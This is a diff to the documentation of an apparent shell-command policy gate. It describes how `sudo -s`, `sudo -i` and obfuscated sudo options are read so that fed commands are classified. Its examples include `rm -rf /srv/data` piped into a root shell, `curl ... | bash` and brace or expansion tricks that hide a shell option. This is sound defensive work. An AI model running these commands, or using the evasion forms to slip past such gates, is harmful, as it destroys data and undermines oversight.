@@ -1295,9 +1295,10 @@ gate does not read:
   as `sudo`, `env` or `timeout` stays in it (`sudo git push --force origin main`). A nested command
   has its text in the nested line: `git push --force origin main` in
   `echo $(git push --force origin main)`, in a `bash -c` or `eval` string, in a heredoc a shell
-  reads and in `ssh host 'git push --force origin main'`. A shell, an interpreter, `ssh` or `xargs`
-  that runs its stdin, also one run by a wrapper such as `setsid` or by `git bisect run`, shows where
-  that stdin comes from: the pipeline from its first command when simple commands pipe into it
+  reads and in `ssh host 'git push --force origin main'`. A shell (also the one `sudo -s` or
+  `sudo -i` starts, #491), an interpreter, `ssh` or `xargs` that runs its stdin, also one run by
+  a wrapper such as `setsid` or by `git bisect run`, shows where that stdin comes from: the
+  pipeline from its first command when simple commands pipe into it
   (`curl -s https://x.example/i.sh | bash`), and no own text when a compound feeds it
   (`{ bash; } < f`). Each such text holds every command before its reader, so the
   texts of a line's readers hold at most four times the line's length plus 4 KB between them, and a
@@ -1804,6 +1805,58 @@ gate does not read:
   part's category. A gh read's other targets (#399) stay on the displaced part, and the line as
   read before #399 keeps the approvers of its own displaced part
   (`sudo gh pr "$V" 5 > /tmp/f`).
+- `sudo -s`, `sudo -i`, `sudo --shell`, `sudo --login` and `doas -s` start the target user's shell
+  (#491). With no command, that shell runs its stdin, so the gate reads it as it reads `bash` with
+  no operand: an `opaque_exec` part that runs its stdin, and the commands of each text the line feeds
+  it (a pipe, a here-string, a heredoc). So `echo 'rm -rf /srv/data' | sudo -s` and
+  `sudo -i <<< 'rm -rf /srv/data'` are `delete` and deny under `deny: [delete]`, and
+  `sudo -s <<< 'cp /tmp/x ~/.exo/policies/x'` is a store write. A stdin the gate cannot read
+  (`sudo -s < /tmp/script.sh`, a variable, a process substitution) asks, and so does `sudo -s` with
+  no feed, as `bash` alone does: a command around the line may give it one. sudo's options are read
+  as getopt reads them, clustered (`-Es`, `-iu root`), with their values (`-u root`, `--user=root`,
+  `--user root`, a unique prefix of a long option), up to `--` or the first operand, then the
+  `NAME=VALUE` words it takes for the environment; behind `env`, `nice`, `timeout`, `command` or
+  another sudo too. A word the gate cannot read that may come to `-s` counts as a shell option: an
+  option word with an expansion or an unquoted glob (`sudo -"$X"`, `sudo -?`) unless the expansion
+  is the value of a letter or `=` before it (`sudo -u"$U" -l` and `sudo --user="$U" -v` stay
+  reads), an option's value that bash may split into several words (`sudo -u $U`, `sudo -u $(id
+  -un)`, a bracket glob such as `sudo -u [!a]s`; a brace set is expanded and its words read as
+  options, a word it makes twice kept, so `sudo -u {root,-s}` is `sudo -u root -s` and
+  `sudo -p {-s,-s}` is `sudo -p -s -s`), and an operand that may expand to an option (`sudo "$X"`,
+  `sudo ?s`, `sudo {-s,}`, `sudo ~-`, which is `$OLDPWD`). Such a word may also take the next word
+  for its value (`sudo -$X root` may be `sudo -iu root`), so when the line feeds the command a
+  stdin, that stdin is read as the shell's too, and the options are also read again from the word
+  after the next one. A brace value whose words end the options elsewhere has its command read as
+  sudo runs it: `sudo -u {root,-p} echo rm -rf /srv/data` is `sudo -u root -p echo rm -rf
+  /srv/data`, whose prompt is `echo`, so it is `delete`, and so is `sudo -"$X" echo rm -rf
+  /srv/data`. These readings also read the words sudo runs as bash expanded them, so a sudo there
+  with a brace value is read in turn (`sudo -E{,p} echo sudo -E{,p} echo rm -rf /srv/data` is
+  `delete`). They may not be bash's, so they add only what their command is known to do:
+  `sudo -u $U cat /etc/hosts` and `sudo -u {alice,bob} ls` stay reads, while a nest of them past
+  the depth cap asks. Past 16 such readings in one call, the call asks. So
+  `sudo -u $U <<< 'rm -rf /srv/data'` is `delete`, and `sudo -u $U` alone asks as `bash` alone
+  does, while `sudo -u $U ls` with no feed stays a read. `sudo -u $U -l`, `sudo -l -U $U` and
+  `sudo -u $U -v` ask too: the gate does not read sudo's list and validate modes, in which no
+  shell starts. With a command, sudo runs `$SHELL -c` on the command's words joined with spaces,
+  each character but a letter, a digit, `_`, `-` and `$` escaped with a backslash. The gate reads
+  that text too where it may differ from the words: a `$` the shell expands again, a newline it
+  drops as a line continuation (`sudo -s $'r\nm' -rf /srv/data` runs `rm`), an empty word, or an
+  option sudo reads otherwise than the prefix reader (`sudo -iu root rm -rf /srv/data` is
+  `delete`). Such a line also asks as `opaque_exec` (unless a policy names `opaque_exec` below
+  ask), as it did when the gate read an unknown program there, and its approval binds to the exact
+  command. That text holds the sudos after it, which its own reading reads in turn, so nested sudo
+  shells are read once per level, and a text read back as its words is not parsed again for each
+  later sudo in it. A later sudo's moved and may readings are still read, since that text holds
+  its brace value as a literal (`sudo -s sudo -u "$U" -u {root,-p} echo rm -rf /srv/data` is
+  `delete`). A word of the command the gate cannot read (`sudo -s rm -rf "$D"`) asks. The line's
+  own parts stay beside these, and the call is also read as before #491, as the last of its
+  floors (`gate.readings`), and decided on each reading, the strictest standing. So a policy that
+  allows the category the shell's parts lead with does not lower a line main asked or logged
+  (`ssh host 'sudo -s < /tmp/script.sh'` still logs under `{opaque_exec: allow}`). Known
+  limits: `su` with no `-c` and `sudo su` with a stdin ask as an unknown program, and the fed
+  text is not read, so a deny on what it carries asks rather than denies; the files a login shell
+  reads first (`sudo -i`) and a `SHELL` that names another program are not read;
+  `env -S 'sudo -s'` with a stdin asks as `env -S bash` does, and the fed text is not read.
 - Wrappers that run a command are read the same way (#160). The prefix wrappers `setsid`,
   `flock`, `chroot`, `unshare`, `nsenter`, `taskset`, `chrt`, `numactl`, `chronic`,
   `unbuffer`, `catchsegv`, `firejail`, `dbus-run-session`, `xvfb-run`, `systemd-run` and
